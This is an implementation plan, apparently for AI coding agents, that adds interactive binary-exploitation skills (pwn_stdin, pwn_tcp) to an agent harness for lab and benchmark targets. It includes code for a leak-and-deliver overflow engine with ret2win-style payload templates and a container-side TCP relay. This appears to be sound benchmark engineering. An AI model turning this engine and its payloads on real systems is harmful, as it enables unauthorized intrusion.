# Interactive Exploit Skills (pwn_stdin / pwn_tcp) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add interactive exploit skills (leak-and-deliver in ONE process/session) so the agent can solve PIE/ASLR targets — homework rung 2 today, ExploitGym `exp.pie` tasks later.

**Architecture:** A host-side step engine (`run_steps`) drives `expect:`/`send:` steps over a transport (an interactive subprocess). Two skills expose it: `pwn_stdin` (docker exec -i of the target) and `pwn_tcp` (an injected in-container python relay to a socket, with optional ExploitGym hex8 size-prefix). ToolBox gains `_docker_spawn`/`_cspawn` and passes them through `run_skill`.

**Tech Stack:** Python 3 (host, f-strings OK), asyncio subprocess, docker CLI. Relay script must be python-3.5-safe (no f-strings). Tests: plain asserts run directly, matching homework/test_skills.py.

## Global Constraints

- Spec: `docs/superpowers/specs/2026-07-28-interactive-skills-design.md`.
- **File-scoped commits only:** NEVER `git add -A` / `git commit -a`; add only the files each commit step lists. Unrelated uncommitted state exists (enigma/engine.py modified, homework/out untracked) — leave it alone.
- Skills NEVER raise — failures return diagnostic text (the tool-must-not-crash contract; `ToolBox.run` backstops it).
- Existing five skills' behavior unchanged — their coroutines only gain an ignored `spawn=None` parameter.
- No changes to `enigma/engine.py`, `homework/solve_rung*.py`, or `homework/src/*`.
- Step grammar: max 8 steps; regexes are single non-space tokens; `{leak}` vars only — no named groups, conditionals, or loops.
- Tests run via `pipenv run python homework/test_skills.py` (and `test_skills_live.py` for Task 4) from /home/owenw/Enigma.
- In test code, write regex literals as RAW strings (`r"main:\s*(0x[0-9a-f]+)"`) — non-raw `"\s"` triggers invalid-escape SyntaxWarnings on Python 3.12+, and test output must stay pristine.

---

### Task 1: Step parsing + leak-template rendering (pure functions)

**Files:**
- Modify: `enigma/skills.py` (append)
- Test: `homework/test_skills.py` (extend)

**Interfaces:**
- Consumes: existing `parse_payload(spec) -> bytes` (enigma/skills.py:40).
- Produces (Task 2 uses these):
  - `parse_steps(arg_tail: str) -> tuple[list[tuple[str, str]] | None, bool, str | None]` — returns `(steps, hex8, error)`. On success `error is None`; on failure `steps is None` and `error` is usage/diagnostic text.
  - `render_template(template: str, leaks: dict[str, int]) -> bytes` — raises `ValueError` on unknown `{leak}` refs or an empty template. Non-DSL terms pass through as literal text (menu answers).

- [ ] **Step 1: Write the failing tests**

Append to `homework/test_skills.py`, before `if __name__`:

```python
from enigma.skills import parse_steps, render_template  # add to the skills import at top


def test_parse_steps_shorthand():
    steps, hex8, err = parse_steps("main:\s*(0x[0-9a-f]+) A*72 + p64({leak}-0xb9)")
    assert err is None, err
    assert steps == [("expect", "main:\s*(0x[0-9a-f]+)"),
                     ("send", "A*72 + p64({leak}-0xb9)")], steps
    assert hex8 is False


def test_parse_steps_explicit_with_hex8():
    steps, hex8, err = parse_steps(
        "expect:Choice: send:1 expect:main:\s*(0x[0-9a-f]+) A*72 + p64({leak}-0xb9) hex8")
    assert err is None, err
    assert steps == [("expect", "Choice:"), ("send", "1"),
                     ("expect", "main:\s*(0x[0-9a-f]+)"),
                     ("send", "A*72 + p64({leak}-0xb9)")], steps
    assert hex8 is True


def test_parse_steps_errors():
    # missing template
    steps, _, err = parse_steps("main:\s*(0x[0-9a-f]+)")
    assert steps is None and err
    # no send step
    steps, _, err = parse_steps("expect:foo expect:bar")
    assert steps is None and "send" in err
    # step limit (9 steps)
    steps, _, err = parse_steps(" ".join(["send:x"] * 9))
    assert steps is None and "8" in err
    # expect regex with a space
    steps, _, err = parse_steps("expect:hello world send:x")
    assert steps is None and err
    # bad regex
    steps, _, err = parse_steps("expect:(unclosed send:x")
    assert steps is None and err


def test_render_template_leaks():
    leaks = {"leak": 0x5555555542c2, "leak1": 0x5555555542c2, "leak2": 0x1000}
    out = render_template("A*72 + p64({leak}-0xb9)", leaks)
    assert out == b"A" * 72 + struct.pack("<Q", 0x5555555542c2 - 0xb9)
    out = render_template("p64({leak2}+16)", leaks)
    assert out == struct.pack("<Q", 0x1010)
    out = render_template("p64({leak2+16})", leaks)  # offset inside braces
    assert out == struct.pack("<Q", 0x1010)
    out = render_template("p64({leak})", leaks)
    assert out == struct.pack("<Q", 0x5555555542c2)
    # literal text terms (menu answers) pass through as bytes
    assert render_template("1", {}) == b"1"
    assert render_template("A*2 + yes", {}) == b"AAyes"
    try:
        render_template("p64({leak3})", leaks)
        raise AssertionError("expected ValueError")
    except ValueError as e:
        assert "leak3" in str(e)
```

And add these calls to `main()` before the final `print`:

```python
    test_parse_steps_shorthand()
    test_parse_steps_explicit_with_hex8()
    test_parse_steps_errors()
    test_render_template_leaks()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pipenv run python homework/test_skills.py`
Expected: FAIL with `ImportError: cannot import name 'parse_steps'`

- [ ] **Step 3: Implement**

Append to `enigma/skills.py`:

```python
# ---- interactive step engine (pwn_stdin / pwn_tcp) ----------------------------
# Leak-and-deliver in ONE session: expect a banner, bind the leak, deliver the
# payload — the only shape that works under ASLR (rung 2 autopsy 2026-07-28:
# one-shot deliver_stdin spawns a fresh process, so leaked runtime addresses
# were always garbage).

_MAX_STEPS = 8

_LEAK_RE = re.compile(
    r"\{(leak\d*)\s*(?:([+-])\s*(0x[0-9a-fA-F]+|\d+))?\}"  # {leak}, {leak-0xb9}
    r"(?:\s*([+-])\s*(0x[0-9a-fA-F]+|\d+))?")              # or {leak}-0xb9


def render_template(template: str, leaks: dict) -> bytes:
    """Substitute {leak}/{leakN} with captured integers (offset inside the
    braces `{leak-0xb9}` or just outside `{leak}-0xb9` — both accepted), then
    parse terms: 'X*N' repeats, p32/p64 packed addresses; anything else is
    LITERAL text (menu answers like '1'). Raises ValueError only on unknown
    leak refs or an empty template."""
    def sub(m):
        name = m.group(1)
        if name not in leaks:
            raise ValueError(f"template references {{{name}}} but no expect "
                             f"captured it (captured: {sorted(leaks) or 'none'})")
        v = leaks[name]
        for sign, off in ((m.group(2), m.group(3)), (m.group(4), m.group(5))):
            if off:
                delta = int(off, 0)
                v = v + delta if sign == "+" else v - delta
        return hex(v)
    template = _LEAK_RE.sub(sub, template)
    out = b""
    for term in template.split("+"):
        term = term.strip()
        if not term:
            continue
        m = re.fullmatch(r"(.)\s*\*\s*(\d+)", term)
        if m:
            out += m.group(1).encode("latin-1") * int(m.group(2))
            continue
        m = re.fullmatch(r"p(32|64)\(\s*(0x[0-9a-fA-F]+|\d+)\s*\)", term)
        if m:
            fmt = "<I" if m.group(1) == "32" else "<Q"
            out += struct.pack(fmt, int(m.group(2), 0))
            continue
        out += term.encode("latin-1")  # literal text term (menu answers etc.)
    if not out:
        raise ValueError("empty send template")
    return out


def parse_steps(arg_tail: str):
    """Parse the step grammar into (steps, hex8, error).

    Steps: expect:<regex> (single non-space token, one capture group binds the
    leak) and send:<template> (may contain spaces; runs to the next step
    token). Shorthand: '<regex> <template...>' == expect+send. Bare 'hex8'
    flags ExploitGym's 8-byte-hex size prefix on the final send."""
    tokens = arg_tail.split()
    hex8 = "hex8" in tokens
    tokens = [t for t in tokens if t != "hex8"]
    explicit = any(t.startswith("expect:") or t.startswith("send:") for t in tokens)
    steps: list = []

    if not explicit:
        if len(tokens) < 2:
            return None, False, ("usage: <regex> <template>  e.g. "
                                 "main:\s*(0x[0-9a-f]+) A*72 + p64({leak}-0xb9)")
        steps = [("expect", tokens[0]), ("send", " ".join(tokens[1:]))]
    else:
        cur_op = None
        cur_val: list = []

        def flush():
            nonlocal cur_op, cur_val
            if cur_op is not None:
                steps.append((cur_op, " ".join(cur_val).strip()))
            cur_op, cur_val = None, []

        for t in tokens:
            if t.startswith("expect:") or t.startswith("send:"):
                flush()
                op, _, first = t.partition(":")
                cur_op = op
                cur_val = [first] if first else []
            else:
                if cur_op is None:
                    return None, False, ("step text %r outside any expect:/send: "
                                         "step" % t)
                cur_val.append(t)
        flush()

    if len(steps) > _MAX_STEPS:
        return None, False, f"too many steps ({len(steps)}); max {_MAX_STEPS}"
    if not any(op == "send" for op, _ in steps):
        return None, False, "no send step — nothing to deliver"
    for op, val in steps:
        if not val:
            return None, False, f"empty {op} step"
        if op == "expect":
            if " " in val:
                return None, False, (f"expect regex must be ONE non-space token "
                                     f"(got {val!r}); write e.g. main:\s*(0x[0-9a-f]+)")
            try:
                re.compile(val)
            except re.error as e:
                return None, False, f"bad expect regex {val!r}: {e}"
    return steps, hex8, None
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pipenv run python homework/test_skills.py`
Expected: PASS — prints `test_skills OK`

- [ ] **Step 5: Commit**

```bash
git add enigma/skills.py homework/test_skills.py
git commit -m "feat(skills): step grammar + leak-template rendering"
```

---

### Task 2: Session engine + pwn_stdin / pwn_tcp skills

**Files:**
- Modify: `enigma/skills.py` (append; also change `run_skill` signature and all five existing coroutines to take `spawn=None`)
- Test: `homework/test_skills.py` (extend)

**Interfaces:**
- Consumes: Task 1's `parse_steps`, `render_template`.
- Produces:
  - `async run_steps(spawn, argv: tuple, steps: list, hex8: bool = False) -> str` — never raises. `spawn(*argv)` is an async callable returning an asyncio subprocess with PIPE stdin/stdout.
  - `async run_skill(name: str, args: str, cexec, spawn=None) -> str` — new optional `spawn`; ALL skill coroutines become `(cexec, args, spawn=None)`.
  - `_RELAY_SRC: str` — the py3.5-safe TCP relay source (also used by the live test in Task 4).
  - `_RELAY_PATH = "/tmp/tcp_relay.py"`

- [ ] **Step 1: Write the failing tests**

Append to `homework/test_skills.py`, before `if __name__`:

```python
from enigma.skills import run_steps, _RELAY_PATH  # add to the skills import at top


class _FakeStdin:
    def __init__(self, proc):
        self.proc = proc
        self.written = b""

    def write(self, data):
        self.written += data
        self.proc._on_write(data)

    async def drain(self):
        pass

    def close(self):
        pass


class FakeProc:
    """Scripted interactive process: preloaded stdout, then per-send responses.

    EOF semantics: with no responses, EOF immediately after the banner; with
    responses, EOF right after the last one (so drains never hang)."""

    def __init__(self, banner: bytes, responses: list):
        import asyncio as _aio
        self.stdout = _aio.StreamReader()
        self.stdout.feed_data(banner)
        self._responses = list(responses)
        if not self._responses:
            self.stdout.feed_eof()
        self.stdin = _FakeStdin(self)

    def _on_write(self, data):
        if self._responses:
            self.stdout.feed_data(self._responses.pop(0))
        if not self._responses:
            self.stdout.feed_eof()

    async def wait(self):
        return 0

    def kill(self):
        pass


def _fake_spawn(proc):
    async def spawn(*argv):
        spawn.argv = argv
        return proc
    return spawn


def test_run_steps_leak_and_deliver():
    main_addr = 0x5555555542C2
    proc = FakeProc(b"rung2: main: 0x%x\n" % main_addr, [b"flag{test}\n"])

    async def go():
        return await run_steps(
            _fake_spawn(proc), ("/target/rung2",),
            [("expect", r"main:\s*(0x[0-9a-f]+)"), ("send", "A*72 + p64({leak}-0xb9)")])

    out = asyncio.run(go())
    assert "flag{test}" in out, out
    assert proc.stdin.written == b"A" * 72 + struct.pack("<Q", main_addr - 0xB9), \
        proc.stdin.written


def test_run_steps_expect_failure_reports_read():
    proc = FakeProc(b"nothing useful here\n", [])

    async def go():
        return await run_steps(_fake_spawn(proc), ("/t",),
                               [("expect", r"main:(0x\S+)"), ("send", "A*1")])

    out = asyncio.run(go())
    assert "expect FAILED" in out and "nothing useful here" in out, out


def test_run_steps_hex8_prefix():
    proc = FakeProc(b"main: 0x1000\n", [b"ok\n"])

    async def go():
        return await run_steps(_fake_spawn(proc), ("/t",),
                               [("expect", r"main:\s*(0x[0-9a-f]+)"),
                                ("send", "A*72 + p64({leak}-0xb9)")], hex8=True)

    asyncio.run(go())
    payload = b"A" * 72 + struct.pack("<Q", 0x1000 - 0xB9)
    assert proc.stdin.written == ("%08x" % len(payload)).encode() + payload


def test_run_steps_multi_expect_leak_vars():
    proc = FakeProc(b"base: 0x2000\nmain: 0x2c2\n", [b"flag{multi}\n"])

    async def go():
        return await run_steps(
            _fake_spawn(proc), ("/t",),
            [("expect", r"base:(0x[0-9a-f]+)"), ("expect", r"main:\s*(0x[0-9a-f]+)"),
             ("send", "p64({leak1}) + p64({leak2}) + p64({leak})")])

    out = asyncio.run(go())
    assert "flag{multi}" in out, out
    want = struct.pack("<Q", 0x2000) + struct.pack("<Q", 0x2C2) + struct.pack("<Q", 0x2C2)
    assert proc.stdin.written == want, proc.stdin.written


def test_pwn_tcp_injects_relay():
    proc = FakeProc(b"main: 0x1000\n", [b"flag{tcp}\n"])
    calls = []

    async def cexec(*argv, input_bytes=None, timeout=None):
        calls.append((argv, input_bytes))
        if argv[0] == "test":
            return 1, ""  # relay missing
        return 0, ""

    async def go():
        from enigma.skills import run_skill
        spawn = _fake_spawn(proc)
        out = await run_skill(
            "pwn_tcp",
            "10.0.0.2 8000 main:\s*(0x[0-9a-f]+) A*72 + p64({leak}-0xb9) hex8",
            cexec, spawn)
        assert spawn.argv == ("python3", _RELAY_PATH, "10.0.0.2", "8000"), \
            spawn.argv
        return out

    out = asyncio.run(go())
    assert "flag{tcp}" in out, out
    assert calls[0][0] == ("test", "-f", _RELAY_PATH), calls
    assert calls[1][0][:2] == ("bash", "-c") and calls[1][1], calls
    payload = b"A" * 72 + struct.pack("<Q", 0x1000 - 0xB9)
    assert proc.stdin.written == ("%08x" % len(payload)).encode() + payload
    from enigma.skills import _RELAY_SRC
    assert 'f"' not in _RELAY_SRC and "os.set_blocking" not in _RELAY_SRC  # py3.5


def test_pwn_stdin_rejects_hex8():
    async def go():
        from enigma.skills import run_skill
        return await run_skill("pwn_stdin", "/t main:(0x1) A*1 hex8", None, None)
    out = asyncio.run(go())
    assert "hex8" in out and "pwn_tcp" in out, out
```

And add to `main()` before the final `print`:

```python
    test_run_steps_leak_and_deliver()
    test_run_steps_expect_failure_reports_read()
    test_run_steps_hex8_prefix()
    test_run_steps_multi_expect_leak_vars()
    test_pwn_tcp_injects_relay()
    test_pwn_stdin_rejects_hex8()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pipenv run python homework/test_skills.py`
Expected: FAIL with `ImportError: cannot import name 'run_steps'`

- [ ] **Step 3: Implement**

Append to `enigma/skills.py`:

```python
_EXPECT_TIMEOUT = 15
_READ_CAP = 65536

_RELAY_PATH = "/tmp/tcp_relay.py"
# TCP relay, injected into the agent container: bridges its stdin/stdout to a
# socket. ExploitGym servers live on an internal docker network the HOST can't
# reach, so the dial must happen container-side. python 3.5-safe (no f-strings,
# no os.set_blocking) — ExploitGym images ship xenial-era python.
_RELAY_SRC = """\
import socket, sys, os, select

s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=10)
watch = [0, s]
while watch:
    r, _, _ = select.select(watch, [], [], 60)
    if not r:
        break
    for fd in r:
        if fd == 0:
            data = os.read(0, 65536)
            if data:
                s.sendall(data)
            else:
                s.shutdown(socket.SHUT_WR)
                watch.remove(0)
        else:
            data = s.recv(65536)
            if not data:
                os._exit(0)
            os.write(1, data)
"""


async def _read_until(proc, pattern: str, deadline: float, buf: str) -> tuple:
    """Read until the regex matches, the deadline passes, EOF, or the read cap.
    `buf` is UNCONSUMED text carried over from the previous expect — a banner
    holding two leaks must not lose its tail. Returns (consumed, rest, match)
    where consumed+rest is everything read so far; match is None on failure.
    latin-1 decode: 1:1 byte map."""
    rx = re.compile(pattern)
    loop = asyncio.get_event_loop()
    while True:
        m = rx.search(buf)
        if m:
            return buf[:m.end()], buf[m.end():], m
        if len(buf) >= _READ_CAP:
            return "", buf, None
        remaining = deadline - loop.time()
        if remaining <= 0:
            return "", buf, None
        try:
            chunk = await asyncio.wait_for(proc.stdout.read(4096), remaining)
        except asyncio.TimeoutError:
            return "", buf, None
        if not chunk:
            return "", buf, None
        buf += chunk.decode("latin-1")


def _to_int(text: str) -> int:
    try:
        return int(text, 0)
    except ValueError:
        return int(text, 16)


async def run_steps(spawn, argv: tuple, steps: list, hex8: bool = False) -> str:
    """Drive one interactive session through expect/send steps. NEVER raises —
    every failure comes back as diagnostic text with what was actually read."""
    try:
        proc = await spawn(*argv)
    except Exception as e:
        return f"spawn failed for {argv}: {e}"
    leaks: dict = {}
    captured = 0
    transcript: list = []
    buf = ""  # unconsumed text carried between expects
    last_send = max(i for i, (op, _) in enumerate(steps) if op == "send")
    try:
        for i, (op, val) in enumerate(steps):
            if op == "expect":
                deadline = asyncio.get_event_loop().time() + _EXPECT_TIMEOUT
                seen, buf, m = await _read_until(proc, val, deadline, buf)
                transcript.append(seen)
                if m is None:
                    return ("expect FAILED: pattern %r not seen (timeout %ds, "
                            "EOF, or %d-byte cap).\nwhat was actually read:\n%s"
                            % (val, _EXPECT_TIMEOUT, _READ_CAP,
                               (seen + buf)[-1200:]))
                if m.groups():
                    captured += 1
                    v = _to_int(m.group(1))
                    leaks["leak%d" % captured] = v
                    leaks["leak"] = v
            else:  # send
                try:
                    payload = render_template(val, leaks)
                except ValueError as e:
                    return "bad send template: %s" % e
                if hex8 and i == last_send:
                    payload = ("%08x" % len(payload)).encode() + payload
                proc.stdin.write(payload)
                await proc.stdin.drain()
                transcript.append(">> sent %d bytes" % len(payload))
        try:
            proc.stdin.close()
        except Exception:
            pass
        deadline = asyncio.get_event_loop().time() + _EXPECT_TIMEOUT
        rest, buf, _ = await _read_until(proc, r"(?!)", deadline, buf)  # to EOF
        transcript.append(rest + buf)
        return "\n".join(t for t in transcript if t)
    finally:
        try:
            proc.kill()
        except Exception:
            pass


async def _skill_pwn_stdin(cexec, args: str, spawn=None) -> str:
    if spawn is None:
        return "pwn_stdin needs an interactive-capable harness (no spawn)"
    binary, _, tail = args.strip().partition(" ")
    if not binary or not tail.strip():
        return ("usage: skill pwn_stdin <binary> <steps>  e.g. "
                "skill pwn_stdin /target/rung2 main:\s*(0x[0-9a-f]+) "
                "A*72 + p64({leak}-0xb9)")
    steps, hex8, err = parse_steps(tail)
    if err:
        return err
    if hex8:
        return "hex8 (size prefix) is only meaningful for pwn_tcp"
    return await run_steps(spawn, (binary,), steps)


async def _skill_pwn_tcp(cexec, args: str, spawn=None) -> str:
    if spawn is None:
        return "pwn_tcp needs an interactive-capable harness (no spawn)"
    parts = args.split(None, 2)
    if len(parts) < 3:
        return ("usage: skill pwn_tcp <host> <port> <steps> [hex8]  e.g. "
                "skill pwn_tcp 172.18.0.5 8000 main:\s*(0x[0-9a-f]+) "
                "A*72 + p64({leak}-0xb9) hex8")
    host, port, tail = parts
    steps, hex8, err = parse_steps(tail)
    if err:
        return err
    code, _ = await cexec("test", "-f", _RELAY_PATH)
    if code != 0:
        code, out = await cexec("bash", "-c", "cat > " + _RELAY_PATH,
                                input_bytes=_RELAY_SRC.encode())
        if code != 0:
            return "failed to inject the tcp relay into the container:\n" + out
    return await run_steps(spawn, ("python3", _RELAY_PATH, host, port),
                           steps, hex8=hex8)
```

Then update the registry and dispatcher (replace the existing `SKILLS`, keep the five current entries, and change every existing coroutine's signature to accept `spawn=None`):

```python
SKILLS = {
    # ... existing five entries unchanged except each coroutine signature gains
    # `spawn=None` ...
    "pwn_stdin": ("pwn_stdin <binary> <steps> — INTERACTIVE: leak and deliver in "
                  "ONE process (required under ASLR/PIE). Steps: expect:<regex> "
                  "send:<template>, or shorthand '<regex> <template>'. {leak}, "
                  "{leak1..N}, {leak±0xN} substitute captured addresses. e.g. "
                  "skill pwn_stdin /target/rung2 main:\s*(0x[0-9a-f]+) "
                  "A*72 + p64({leak}-0xb9)",
                  _skill_pwn_stdin),
    "pwn_tcp": ("pwn_tcp <host> <port> <steps> [hex8] — same engine over a TCP "
                "socket (dialed from inside the container). hex8 adds "
                "ExploitGym's 8-byte-hex size prefix to the final payload. e.g. "
                "skill pwn_tcp 172.18.0.5 8000 main:\s*(0x[0-9a-f]+) "
                "A*72 + p64({leak}-0xb9) hex8",
                _skill_pwn_tcp),
}


async def run_skill(name: str, args: str, cexec, spawn=None) -> str:
    entry = SKILLS.get(name)
    if entry is None:
        return ("unknown skill '%s'; available:\n" % name) + skill_docs()
    return await entry[1](cexec, args, spawn)
```

The five existing coroutines change signature only — e.g.
`async def _skill_discover_offset(cexec, args: str, spawn=None) -> str:` —
bodies untouched.

- [ ] **Step 4: Run test to verify it passes**

Run: `pipenv run python homework/test_skills.py`
Expected: PASS — prints `test_skills OK`

- [ ] **Step 5: Commit**

```bash
git add enigma/skills.py homework/test_skills.py
git commit -m "feat(skills): session engine + pwn_stdin/pwn_tcp skills"
```

---

### Task 3: ToolBox spawn plumbing

**Files:**
- Modify: `enigma/tools.py` — add `_docker_spawn` + `_cspawn` near `_docker` (~line 200), update `_skill` (line 209-213)
- Test: `homework/test_skills.py` (extend)

**Interfaces:**
- Consumes: Task 2's `run_skill(name, args, cexec, spawn=None)`.
- Produces:
  - `ToolBox._docker_spawn(*args) -> asyncio.subprocess.Process` — PIPE stdin/stdout, stderr merged to stdout, `start_new_session=True`.
  - `ToolBox._cspawn(*argv) -> asyncio.subprocess.Process` — `_docker_spawn("exec", "-i", container, *argv)`.

- [ ] **Step 1: Write the failing test**

Append to `homework/test_skills.py`, before `if __name__`:

```python
def test_toolbox_pwn_dispatch():
    """TOOL skill: pwn_stdin reaches run_steps via ToolBox._cspawn."""
    import types

    from enigma.tools import ToolBox

    main_addr = 0x5555555542C2
    proc = FakeProc(b"main: 0x%x\n" % main_addr, [b"flag{via_toolbox}\n"])

    async def go():
        tb = ToolBox.__new__(ToolBox)
        tb._container = "fakecid"
        tb._workdir = "/workspace"
        tb._names = ("shell", "write", "read", "calc", "skill")
        tb.cfg = types.SimpleNamespace(tool_timeout_s=60, tool_result_chars=10000)
        tb.http = None

        async def fake_spawn(*args):
            assert args[:3] == ("exec", "-i", "fakecid"), args
            assert args[3] == "/target/rung2", args
            return proc

        tb._docker_spawn = fake_spawn
        return await tb.run(
            "skill",
            "pwn_stdin /target/rung2 main:\s*(0x[0-9a-f]+) A*72 + p64({leak}-0xb9)")

    out = asyncio.run(go())
    assert "flag{via_toolbox}" in out, out
    assert proc.stdin.written == b"A" * 72 + struct.pack("<Q", main_addr - 0xB9)
    docs = ToolBox.docs(tb)
    assert "pwn_stdin" in docs and "pwn_tcp" in docs
```

And add `test_toolbox_pwn_dispatch()` to `main()` before the final `print`.

- [ ] **Step 2: Run test to verify it fails**

Run: `pipenv run python homework/test_skills.py`
Expected: FAIL — pwn_stdin reports it needs an interactive-capable harness (spawn=None)

- [ ] **Step 3: Implement**

In `enigma/tools.py`, after `_docker` (keep `_cexec` as-is), add:

```python
    async def _docker_spawn(self, *args: str) -> asyncio.subprocess.Process:
        """Spawn an INTERACTIVE docker process (PIPE stdin/stdout, stderr
        merged). The caller owns the lifecycle — used by session skills
        (pwn_stdin/pwn_tcp) that read a leak before writing a payload."""
        return await asyncio.create_subprocess_exec(
            "docker", *args,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            start_new_session=True,
        )

    async def _cspawn(self, *argv: str) -> asyncio.subprocess.Process:
        """Spawn argv interactively inside the bound container (spawn protocol
        handed to session skills — see enigma/skills.py run_steps)."""
        return await self._docker_spawn("exec", "-i", self._container, *argv)
```

And update `_skill` to pass it:

```python
    async def _skill(self, arg: str) -> str:
        if self._container is None:
            return "no container bound"
        name, _, rest = arg.strip().partition(" ")
        return self._clip(await run_skill(name.strip(), rest.strip(),
                                          self._cexec, self._cspawn))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pipenv run python homework/test_skills.py`
Expected: PASS — prints `test_skills OK`

- [ ] **Step 5: Commit**

```bash
git add enigma/tools.py homework/test_skills.py
git commit -m "feat(tools): interactive docker spawn plumbing for session skills"
```

---

### Task 4: Live integration tests (rung 2 + TCP relay)

**Files:**
- Modify: `homework/test_skills_live.py` (extend `main()`)

**Interfaces:**
- Consumes: everything above; the `enigma-homework:latest` image (has python3, gdb, nm); `homework/flags.json` key `rung2`; `_RELAY_SRC`/`_RELAY_PATH` from enigma/skills.py.
- Produces: nothing consumed by later tasks.

- [ ] **Step 1: Extend the live test**

In `homework/test_skills_live.py`, inside `main()` after the existing rung1 assertions (before the docs assert), add:

```python
            # ---- rung2: PIE leak-and-deliver in ONE process via pwn_stdin ----
            sh("docker", "cp", os.path.join(HERE, "flags", "rung2.txt"),
               "%s:/flag.txt" % NAME)
            expected2 = json.load(open(os.path.join(HERE, "flags.json")))["rung2"]

            out = await tb.run("skill", "find_symbol /target/rung2 main")
            assert "0x" in out and "PIE" in out, out
            main_off = int(out.split("file offset ")[1].split(" ")[0], 16)
            out = await tb.run("skill", "find_symbol /target/rung2 win")
            win_off = int(out.split("file offset ")[1].split(" ")[0], 16)
            delta = main_off - win_off  # win = leak - delta

            out = await tb.run(
                "skill",
                "pwn_stdin /target/rung2 main:\s*(0x[0-9a-f]+) "
                "A*72 + p64({leak}-0x%x)" % delta)
            assert expected2 in out, out

            # ---- tcp transport: leak server behind the in-container relay ----
            server_src = (
                "import socket\n"
                "s = socket.socket()\n"
                "s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
                "s.bind(('127.0.0.1', 31337))\n"
                "s.listen(1)\n"
                "c, _ = s.accept()\n"
                "c.sendall(b'main: 0x1000\\n')\n"
                "hdr = c.recv(8)\n"
                "n = int(hdr.decode(), 16)\n"
                "data = b''\n"
                "while len(data) < n:\n"
                "    chunk = c.recv(n - len(data))\n"
                "    if not chunk:\n"
                "        break\n"
                "    data += chunk\n"
                "import struct\n"
                "want = b'A' * 72 + struct.pack('<Q', 0x1000 - 0xb9)\n"
                "c.sendall(b'flag{tcp_live}\\n' if data == want else b'nope\\n')\n"
                "c.close()\n"
            )
            code, out_ = await tb._cexec("bash", "-c",
                                         "cat > /tmp/leak_server.py",
                                         input_bytes=server_src.encode())
            assert code == 0, out_
            code, out_ = await tb._cexec(
                "bash", "-c",
                "nohup python3 /tmp/leak_server.py >/tmp/srv.log 2>&1 & sleep 1; "
                "echo started")
            assert "started" in out_, out_

            out = await tb.run(
                "skill",
                "pwn_tcp 127.0.0.1 31337 main:\s*(0x[0-9a-f]+) "
                "A*72 + p64({leak}-0xb9) hex8")
            assert "flag{tcp_live}" in out, out
```

Notes for the implementer:
- The rung2 portion REPLACES `/flag.txt` with rung2's flag after the rung1 checks (the container's flag file is per-rung by design).
- `tb._cexec` is the same callable skills receive; using it in the test is deliberate — it exercises the real injection path.
- rung2's offset-to-retaddr is 72 (same -O0 layout as rung1; verified in the 2026-07-28 ladder transcripts).

- [ ] **Step 2: Run it**

Run: `pipenv run python homework/test_skills_live.py`
Expected: PASS — prints `test_skills_live OK` (rung1 chain + rung2 pwn_stdin chain + tcp relay chain all verified). Use a 240s Bash timeout.

- [ ] **Step 3: Commit**

```bash
git add homework/test_skills_live.py
git commit -m "test(skills): live rung2 pwn_stdin + tcp relay integration"
```

---

### Task 5: Gate run + AGENTS.md

**Files:**
- Modify: `AGENTS.md`

**Interfaces:**
- Consumes: everything above.

- [ ] **Step 1: Gate run — agent solves rung 2 with pwn_stdin**

Run (background, up to ~35 min):

```bash
cd ~/Enigma && pipenv run python homework/run_hw.py --rung 2 --steps 120 --timeout 1800
```

Expected: `status=solved` with `skill_steps > 0`, and the transcript
(`homework/out/rung2_<ts>.jsonl`) shows `pwn_stdin` (or `pwn_tcp`) calls. A
solve without the skill still validates tagging (`solved_with_skill=False`)
but does NOT pass this gate — the gate exists to prove the skill unblocks
PIE.

- [ ] **Step 2: Update AGENTS.md**

Extend the "## Skill tools (2026-07-28)" section with:

```markdown
- Interactive skills added 2026-07-28 (rung 2 was structurally unsolvable:
  one-shot delivery respawns the process, ASLR re-randomizes): `pwn_stdin`
  (expect/send step engine over one process) and `pwn_tcp` (same engine over
  an in-container TCP relay; `hex8` = ExploitGym's 8-byte-hex size prefix).
  {leak}/{leakN}/{leak±0xN} template vars bind expect captures.
  Design: docs/superpowers/specs/2026-07-28-interactive-skills-design.md
```

Plus the gate outcome (solve status, steps, skill_steps).

- [ ] **Step 3: Commit**

```bash
git add AGENTS.md
git commit -m "docs: interactive skills + rung2 gate result in AGENTS.md"
```
